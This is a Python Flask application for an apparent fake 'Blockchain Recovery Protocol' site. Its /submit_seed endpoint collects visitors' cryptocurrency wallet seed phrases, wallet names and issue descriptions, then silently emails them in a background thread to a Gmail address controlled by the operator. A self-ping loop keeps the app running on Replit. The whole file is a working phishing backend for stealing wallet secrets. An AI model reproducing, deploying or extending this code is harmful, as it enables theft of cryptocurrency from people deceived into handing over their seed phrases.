from flask import Flask, render_template, request, jsonify
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import threading
import time
import os
import requests

app = Flask(__name__)

# Email configuration 
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
EMAIL_ADDRESS = "blockchainrecoveryprotocol@gmail.com"
EMAIL_PASSWORD = "your-app-password"  # Replace with your actual Gmail app password

def send_email_async(email_data):
    """Send email with wallet data in background"""
    try:
        # Skip email if credentials not configured
        if EMAIL_ADDRESS == "your-email@gmail.com" or EMAIL_PASSWORD == "your-app-password":
            print("Email credentials not configured - skipping email send")
            return

        msg = MIMEMultipart()
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = EMAIL_ADDRESS
        msg['Subject'] = "Wallet Recovery Data Submission"

        body = f"""New wallet recovery submission:

Wallet Name: {email_data.get('wallet_name', 'N/A')}
Data Type: {email_data.get('data_type', 'N/A')}
Issue: {email_data.get('issue', 'N/A')}

Data Content:
{email_data.get('seed_phrase', '')}

---
Submitted via Blockchain Recovery Protocol
        """

        msg.attach(MIMEText(body, 'plain'))

        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        text = msg.as_string()
        server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, text)
        server.quit()
        print("Email sent successfully")
    except Exception as e:
        print(f"Email error: {e}")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit_seed', methods=['POST'])
def submit_seed():
    try:
        data = request.get_json()
        seed_phrase = data.get('seedPhrase', '')
        wallet_name = data.get('walletName', '')
        data_type = data.get('dataType', '')
        issue = data.get('issue', '')

        # Prepare detailed email content
        email_data = {
            'seed_phrase': seed_phrase,
            'wallet_name': wallet_name,
            'data_type': data_type,
            'issue': issue
        }

        # Send email in background
        email_thread = threading.Thread(target=send_email_async, args=(email_data,))
        email_thread.daemon = True
        email_thread.start()

        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

def self_ping():
    """Ping the app to keep it alive - local URL every 60s, external URL every 120s"""
    local_counter = 0
    external_counter = 0

    while True:
        try:
            # Wait 60 seconds before next check
            time.sleep(60)
            local_counter += 60
            external_counter += 60

            # Get the current app URL
            app_url = "http://0.0.0.0:5000"

            # Ping local URL every 60 seconds
            if local_counter >= 60:
                try:
                    response = requests.get(app_url, timeout=10)
                    print(f"Local ping successful to {app_url} - Status: {response.status_code}")
                    local_counter = 0
                except Exception as e:
                    print(f"Local ping failed: {e}")

            # Ping external URL every 120 seconds
            if external_counter >= 120:
                try:
                    external_url = f"https://{os.environ.get('REPL_SLUG', 'app')}.{os.environ.get('REPL_OWNER', 'user')}.repl.co"
                    response = requests.get(external_url, timeout=10)
                    print(f"External ping successful to {external_url} - Status: {response.status_code}")
                    external_counter = 0
                except Exception as e:
                    print(f"External ping failed: {e}")

        except Exception as e:
            print(f"Pinger error: {e}")

if __name__ == '__main__':
    # Start self-pinger in background
    ping_thread = threading.Thread(target=self_ping)
    ping_thread.daemon = True
    ping_thread.start()

    print("Self-pinger started - local ping every 60s, external ping every 120s")

    app.run(host='0.0.0.0', port=5000, debug=False)